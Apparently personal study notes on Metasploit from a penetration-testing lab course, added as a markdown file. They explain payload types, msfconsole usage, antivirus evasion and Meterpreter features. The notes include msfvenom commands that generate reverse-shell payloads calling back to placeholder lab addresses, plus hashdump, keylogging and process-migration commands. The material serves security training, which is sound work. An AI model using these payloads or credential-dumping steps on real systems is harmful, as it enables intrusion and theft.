@@ -1,0 +1,123 @@
+## Metasploit
+• Exploit: A piece of code that uses a vulnerability present on the target system.
+• Vulnerability: A design, coding, or logic flaw affecting the target system. The exploitation of a vulnerability can result in disclosing confidential information or allowing the attacker to execute code on the target system.
+• Payload: An exploit will take advantage of a vulnerability. However, if we want the exploit to have the result we want (gaining access to the target system, read confidential information, etc.), we need to use a payload. Payloads are the code that will run on the target system.
+
+
+
+Encoders
+Encoders will allow you to encode the exploit and payload in the hope that a signature-based antivirus solution may miss them.
+Signature-based antivirus and security solutions have a database of known threats. They detect threats by comparing suspicious files to this database and raise an alert if there is a match. Thus encoders can have a limited success rate as antivirus solutions can perform additional checks.
+
+Evasion
+While encoders will encode the payload, they should not be considered a direct attempt to evade antivirus software. On the other hand, “evasion” modules will try that, with more or less success.
+
+
+Payloads
+Payloads are codes that will run on the target system.
+Exploits will leverage a vulnerability on the target system, but to achieve the desired result, we will need a payload. Examples could be; getting a shell, loading a malware or backdoor to the target system, running a command, or launching calc.exe as a proof of concept to add to the penetration test report. Starting the calculator on the target system remotely by launching the calc.exe application is a benign way to show that we can run commands on the target system.
+Running command on the target system is already an important step but having an interactive connection that allows you to type commands that will be executed on the target system is better. Such an interactive command line is called a "shell". Metasploit offers the ability to send different payloads that can open shells on the target system.
+
+	You will see four different directories under payloads: adapters, singles, stagers and stages.
+• Adapters: An adapter wraps single payloads to convert them into different formats. For example, a normal single payload can be wrapped inside a Powershell adapter, which will make a single powershell command that will execute the payload.
+
+• Singles: Self-contained payloads (add user, launch notepad.exe, etc.) that do not need to download an additional component to run.
+• Stagers: Responsible for setting up a connection channel between Metasploit and the target system. Useful when working with staged payloads. “Staged payloads” will first upload a stager on the target system then download the rest of the payload (stage). This provides some advantages as the initial size of the payload will be relatively small compared to the full payload sent at once.
+• Stages: Downloaded by the stager. This will allow you to use larger sized payloads.
+
+
+Commands
+Alternatively, you can use the info command followed by the module’s path from the msfconsole prompt (e.g. info exploit/windows/smb/ms17_010_eternalblue). Info is not a help menu; it will display detailed information on the module such as its author, relevant sources, etc.
+
+One of the most useful commands in msfconsole is search. This command will search the Metasploit Framework database for modules relevant to the given search parameter. You can conduct searches using CVE numbers, exploit names (eternalblue, heartbleed, etc.), or target system.
+
+
+
+• The regular command prompt: You can not use Metasploit commands here.
+
+Regular command prompt
+root@ip-10-10-XX-XX:~#
+
+
+◇ The msfconsole prompt: msf6 (or msf5 depending on your installed version) is the msfconsole prompt. As you can see, no context is set here, so context-specific commands to set parameters and run modules can not be used here.
+
+
+Metasploitcommand prompt
+msf6 >
+
+
+◇ A context prompt: Once you have decided to use a module and used the set command to chose it, the msfconsole will show the context. You can use context-specific commands (e.g. set RHOSTS 10.10.x.x) here.
+
+A context command prompt
+msf6 exploit(windows/smb/ms17_010_eternalblue) >
+
+
+◇ The Meterpreter prompt: Meterpreter is an important payload we will see in detail later in this module. This means a Meterpreter agent was loaded to the target system and connected back to you. You can use Meterpreter specific commands here.
+
+
+AMeterpretercommand prompt
+meterpreter >
+
+
+◇ A shell on the target system: Once the exploit is completed, you may have access to a command shell on the target system. This is a regular command line, and all commands typed here run on the target system.
+
+
+
+AMeterpretercommand prompt
+C:\Windows\system32>
+
+
+
+show options
+set parameter value - set rhosts 198.168.1.9
+unset all
+
+ The setg command allows you to set the value so it can be used by default across different modules. You can clear any value set with setg using unsetg
+ 
+ 
+ Using modules
+Once all module parameters are set, you can launch the module using the exploit command. Metasploit also supports the run command, which is an alias created for the exploit command as the word exploit did not make sense when using modules that were not exploits (port scanners, vulnerability scanners, etc.).
+
+The exploit command can be used without any parameters or using the “-z” parameter.
+The exploit -z command will run the exploit and background the session as soon as it opens.
+
+
+You can use the¬†background¬†command to background the session prompt and go back to the msfconsole prompt.
+The¬†sessions¬†command can be used from the msfconsole prompt or any context to see the existing sessions.
+select => sessions -i and the number => sessions -i 2
+
+
+Msfvenom, which replaced Msfpayload and Msfencode, allows you to generate payloads.
+
+Msfvenom will allow you to access all payloads available in the  Metasploit framework. Msfvenom allows you to create payloads in many different formats (PHP, exe, dll, elf, etc.) and for many different target systems (Apple, Windows, Android, Linux, etc.).
+
+Linux Executable and Linkable Format (elf)
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf
+The .elf format is comparable to the .exe format in Windows. These are executable files for Linux. However, you may still need to make sure they have executable permissions on the target machine. For example, once you have the shell.elf file on your target machine, use the chmod +x shell.elf command to accord executable permissions. Once done, you can run this file by typing ./shell.elf on the target machine command line.
+
+Windows
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe
+
+PHP
+msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php
+
+ASP
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp
+
+Python
+msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py
+
+
+
+for windows metepreter command for hashes - ‘hashdump’  
+for linux -  ‘run post/linux/gather/hashdump’
+
+
+Meterpreter runs on the target system but is not installed on it. It runs in memory and does not write itself to the disk on the target. This feature aims to avoid being detected during antivirus scans
+
+
+Migrate
+Migrating to another process will help Meterpreter interact with it. For example, if you see a word processor running on the target (e.g. word.exe, notepad.exe, etc.), you can migrate to it and start capturing keystrokes sent by the user to this process. Some Meterpreter versions will offer you the keyscan_start, keyscan_stop, and keyscan_dump command options to make Meterpreter act like a keylogger. Migrating to another process may also help you to have a more stable Meterpreter session.
+To migrate to any process, you need to type the migrate command followed by the PID of the desired target process. The example below shows Meterpreter migrating to process ID 716
+
+
